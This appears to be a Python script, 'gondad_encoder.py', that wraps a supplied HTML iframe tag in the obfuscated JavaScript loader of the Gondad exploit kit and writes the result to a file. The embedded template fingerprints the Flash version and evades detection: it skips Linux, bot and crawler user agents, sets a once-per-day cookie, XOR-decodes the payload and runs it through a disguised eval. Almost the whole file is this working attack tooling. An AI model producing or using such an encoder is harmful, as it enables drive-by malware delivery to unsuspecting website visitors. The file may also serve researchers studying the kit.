# by Hakawati
##  http://www.hakawati.co.kr/
import os, re
import optparse
try:
    import numpy
except ImportError:
    print "sudo pip install numpy"

class encoder:
    def __init__(self):
        """
        """

    def gondadEncoder(self, data):
        op_txt = 0
        k = 0
        cyp = ''
        txt = []
        SupportTxt = "<script type=\"text/javascript\" src=\"swfobject.js\"></script>\n<script src=jpg.js></script>\n<script type=\"text/javascript\">\nvar oRDS8=navigator.userAgent.toLowerCase();\nvar UlQcp6=\"1\"+\"1\"+\"1\";\nif(document.cookie.indexOf(\"Kzkr6=\")==-1 && oRDS8.indexOf(\"linux\")<=-1 && oRDS8.indexOf(\"bot\")==-1 && oRDS8.indexOf(\"spider\")==-1)\n{\nvar mCBrLXb1=deconcept.SWFObjectUtil.getPlayerVersion();\nvar expires=new Date();\nexpires.setTime(expires.getTime()+24*60*60*1000);\nUlQcp6=\"0\"+\"0\";\ndocument.cookie=\"Kzkr6=Yes;path=/;expires=\"+expires.toGMTString();\nfaug8=\"1\";delete faug8;try{faug8+=\"0\"+\"0\"+\"0\"+\"0\"+\"0\"+\"0\"+\"0\"+\"0\"+\"0\";}catch(e){var gOqA0=\"1\";dLidfS6 = eval}qQhifJ0=unescape;"
        ObfusTxt1 = "function Xmstqj3(){YRPsiYR7=Math.PI;iGNrX2=Math.tan;skss8=parseInt;miIl3='length';BLKsBW0='test';hxyB5='replace';sXdvdnE4=skss8(~((YRPsiYR7&YRPsiYR7)|(~YRPsiYR7&YRPsiYR7)&(YRPsiYR7&~YRPsiYR7)|(~YRPsiYR7&~YRPsiYR7)));HgfQOIU6=skss8(((sXdvdnE4&sXdvdnE4)|(~sXdvdnE4&sXdvdnE4)&(sXdvdnE4&~sXdvdnE4)|(~sXdvdnE4&~sXdvdnE4))&1);/*www.yylis.com*/JuVsvVJ4=HgfQOIU6<<HgfQOIU6;new function(){NUIRS0=dLidfS6('1Qe4dG*]6zY^k8vb]#&,m8$[x_GD3a]Nj5dsn7[F[8cu[S34Rlc]4r;idpDt='[hxyB5](/[^v@0el9a]/g,''));};try{if(!\/^\\\\d*$\/g[BLKsBW0](VKdaMw0));}catch(e){VKdaMw0=sXdvdnE4;}otlkVb6='';TbXQyj0=String[qQhifJ0('%6'+'6%72%'+'6F%6D%4'+'3%68%61'+'%72%4'+'3%6F%64'+'%65')];for(mWQywTw0=sXdvdnE4;mWQywTw0<UgoVGYH0[miIl3];mWQywTw0-=-HgfQOIU6)VKdaMw0=((VKdaMw0&127)<<25)|((VKdaMw0&4294967168)>>>7)+UgoVGYH0.charCodeAt(mWQywTw0);syzMMty7+=HgfQOIU6;VKdaMw0>>>=0;for(mWQywTw0=sXdvdnE4,yPHSYM7=HgfQOIU6;mWQywTw0<GndC0[miIl3];mWQywTw0+=JuVsvVJ4,yPHSYM7++){if(mWQywTw0>=(1<<3)){PuDe7=mWQywTw0%(1<<3);}else {PuDe7=mWQywTw0;}dyLU3=skss8('0x'+VKdaMw0.toString(HgfQOIU6<<4).substr(PuDe7,2))+yPHSYM7;if(\/^(\\\\d{4})\/g[BLKsBW0](dyLU3+744))dyLU3%=3;otlkVb6+=TbXQyj0(skss8(sXdvdnE4+qQhifJ0('x')+GndC0.charAt(mWQywTw0)+GndC0.charAt(mWQywTw0+skss8(HgfQOIU6)))^dyLU3);}try{new function(){NUIRS0(otlkVb6);}}catch(e){try{new function(){FTWphd5=parseInt;iGNrX2(otlkVb6);}}catch(e) {window.location='.';}}}try{dLidfS6('Xmstqj3();')}catch(e) {try{syzMMty7=sXdvdnE4;dLidfS6('Xmstqj3();');}catch(e){alert('ere');}}"
        ObfusTxt2 = "function Xmstqj3(){YRPsiYR7=Math.PI;iGNrX2=Math.tan;skss8=parseInt;miIl3='length';BLKsBW0='test';hxyB5='replace';sXdvdnE4=skss8(~((YRPsiYR7&YRPsiYR7)|(~YRPsiYR7&YRPsiYR7)&(YRPsiYR7&~YRPsiYR7)|(~YRPsiYR7&~YRPsiYR7)));HgfQOIU6=skss8(((sXdvdnE4&sXdvdnE4)|(~sXdvdnE4&sXdvdnE4)&(sXdvdnE4&~sXdvdnE4)|(~sXdvdnE4&~sXdvdnE4))&1);/*www.yylis.com*/JuVsvVJ4=HgfQOIU6<<HgfQOIU6;new function(){NUIRS0=dLidfS6('1Qe4dG*]6zY^k8vb]#&,m8$[x_GD3a]Nj5dsn7[F[8cu[S34Rlc]4r;idpDt='[hxyB5](/[^v@0el9a]/g,''));};try{if(!/^\d*$/g[BLKsBW0](VKdaMw0));}catch(e){VKdaMw0=sXdvdnE4;}otlkVb6='';TbXQyj0=String[qQhifJ0('%6'+'6%72%'+'6F%6D%4'+'3%68%61'+'%72%4'+'3%6F%64'+'%65')];for(mWQywTw0=sXdvdnE4;mWQywTw0<UgoVGYH0[miIl3];mWQywTw0-=-HgfQOIU6)VKdaMw0=((VKdaMw0&127)<<25)|((VKdaMw0&4294967168)>>>7)+UgoVGYH0.charCodeAt(mWQywTw0);syzMMty7+=HgfQOIU6;VKdaMw0>>>=0;for(mWQywTw0=sXdvdnE4,yPHSYM7=HgfQOIU6;mWQywTw0<GndC0[miIl3];mWQywTw0+=JuVsvVJ4,yPHSYM7++){if(mWQywTw0>=(1<<3)){PuDe7=mWQywTw0%(1<<3);}else {PuDe7=mWQywTw0;}dyLU3=skss8('0x'+VKdaMw0.toString(HgfQOIU6<<4).substr(PuDe7,2))+yPHSYM7;if(/^(\d{4})/g[BLKsBW0](dyLU3+744))dyLU3%=3;otlkVb6+=TbXQyj0(skss8(sXdvdnE4+qQhifJ0('x')+GndC0.charAt(mWQywTw0)+GndC0.charAt(mWQywTw0+skss8(HgfQOIU6)))^dyLU3);}try{new function(){NUIRS0(otlkVb6);}}catch(e){try{new function(){FTWphd5=parseInt;iGNrX2(otlkVb6);}}catch(e) {window.location='.';}}}try{dLidfS6('Xmstqj3();')}catch(e) {try{syzMMty7=sXdvdnE4;dLidfS6('Xmstqj3();');}catch(e){alert('ere');}}"
        ObfusTxt3 = "UgoVGYH0=\"%s\";" %(ObfusTxt1)+"tfFzFYX7 = dLidfS6(dLidfS6);tfFzFYX7(UgoVGYH0);\n}\n</script>"
        for i in range(2):
            for j in range(len(ObfusTxt2)):
                op_txt1 = (op_txt & 127) << 25
                op_txt2 = (op_txt & 4294967168)>> 7
                op_txt = numpy.int32((op_txt1 | op_txt2) + ord(ObfusTxt2[j]))

        op_txt = hex(numpy.uint32(op_txt))[2:-1]
        
        for i in range(len(data)):
            if k < 8:
                k = k
            else: 
                k = k % 8
            key = int(op_txt[k:k+2],16) + i + 1
            if key > 255:
                key %= 3
            cyp = data[i].encode("hex")
            txt1 = hex(int(cyp,16)^key)[2:]
            if re.search('^[0-9a-fA-F]{1}$',txt1):
                txt1 = '0'+txt1
            txt += [txt1]
            k = k + 2
        obf_data = "".join(txt).upper()
        CyperTxt2 = "GndC0=\"%s\";" %(obf_data)
        full_code = SupportTxt + CyperTxt2 + ObfusTxt3
        return full_code


class optParser:

    def __init__(self):
        """
        """

    def inputParser(self, opt_in):
        script = open(opt_in).read()
        script1 = []
        script1 += str(script)
        return script1

    def outParser(self, opt_out, opt_print, result):
        if opt_print:
            if opt_out:
                open(opt_out,'w').write(result)
                print 'open \'%s\' file' %(opt_out)
        else:
            if opt_out:
                open(opt_out,'w').write(result)
                print 'open \'%s\' file' %(opt_out)
            else:
                open('out.js','w').write(result)
                print 'open \'out.html\' file'

def run():
    print '\nVersion: 0.1'
    parser =  optparse.OptionParser('\n\tgondad_encoder.py -i [input file name] -o [output file name]\n' + \
                                    '\t(if -o option is null, default use out.html)\n' + \
                                    '\t(if you use -p options, default disuse -o option)\n')

    parser.add_option('-i', '--input', dest='IN', type='string', help='input iframe tag code in HTML')
    parser.add_option('-o', '--output', dest='OUT', type='string', help='output javascript file name')
    parser.add_option('-p', '--print', dest='PRINT', help='print value and obf-code', default="", action='store_true')
    (options, args) = parser.parse_args()

    try:
        e = encoder()
        opt = optParser()
        opt_in = options.IN
        opt_out = options.OUT
        opt_print = options.PRINT

        data = opt.inputParser(opt_in)
        if data:
            result = e.gondadEncoder(data)
        else:
            print 'input ip or domain or file\n\n'

        if opt_print:
            print '\nresult:\n%s' %result
        opt.outParser(opt_out, opt_print, result)

    except TypeError as e:
#        parser.print_help()
        print e


if __name__=='__main__':
    run()

